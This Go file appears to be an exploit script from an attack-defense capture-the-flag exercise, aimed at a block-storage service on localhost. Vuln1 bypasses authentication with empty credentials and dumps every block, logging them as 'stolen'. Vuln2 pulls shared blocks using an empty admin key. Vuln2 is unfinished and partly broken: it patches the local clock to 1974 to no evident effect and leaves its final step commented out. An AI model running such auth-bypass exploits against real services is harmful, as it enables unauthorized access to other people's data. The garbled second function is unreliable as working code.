package main

import (
	"context"
	"encoding/json"
	"fmt"
	"github.com/bouk/monkey"
	"go.uber.org/zap"
	"summer-2022/lib"
	"summer-2022/proto"
	"time"
)

func main() {
	logger, _ := zap.NewDevelopment()
	defer logger.Sync()

	host := "localhost"

	Vuln1(host, logger)
	Vuln2(host, logger)
}

func Vuln1(host string, logger *zap.Logger) {
	client, err := NewClient(context.Background(), host+":9090", host+":8090", logger)
	if err != nil {
		logger.Fatal(err.Error())
	}

	creds := lib.Credentials{
		Login: "",
		Token: "",
	}

	marshal, err := json.Marshal(creds)
	if err != nil {
		logger.Fatal(err.Error())
	}

	client.SetAuth(&proto.AuthInfo{
		Token: string(marshal),
	})

	blocks, err := client.GetBlocks(context.Background())
	if err != nil {
		logger.Fatal(err.Error())
	}

	logger.Info("stolen", zap.Reflect("blocks", blocks))
}

func Vuln2(host string, logger *zap.Logger) {
	client, err := NewClient(context.Background(), host+":9090", host+":8090", logger)
	if err != nil {
		logger.Fatal(err.Error())
	}

	creds := lib.Credentials{
		Login: "",
		Token: "",
	}

	marshal, err := json.Marshal(creds)
	if err != nil {
		logger.Fatal(err.Error())
	}

	client.SetAuth(&proto.AuthInfo{
		Token: string(marshal),
	})

	list, err := client.GetSharedList(context.Background())
	if err != nil {
		logger.Fatal(err.Error())
	}

	for _, id := range list {
		shared, err := client.GetShared(context.Background(), &proto.GetSharedBlock{
			SharedId: id,
			AdminKey: "",
		})
		if err != nil {
			logger.Fatal(err.Error())
		}

		wayback := time.Date(1974, time.May, 19, 1, 2, 3, 4, time.UTC)
		patch := monkey.Patch(time.Now, func() time.Time { return wayback })
		defer patch.Unpatch()
		fmt.Printf("It is now %s\n", time.Now())
	}

	//blocks, err := client.PutShared(context.Background(), )
	if err != nil {
		logger.Fatal(err.Error())
	}

	//logger.Info("stolen", zap.Reflect("blocks", blocks))
}
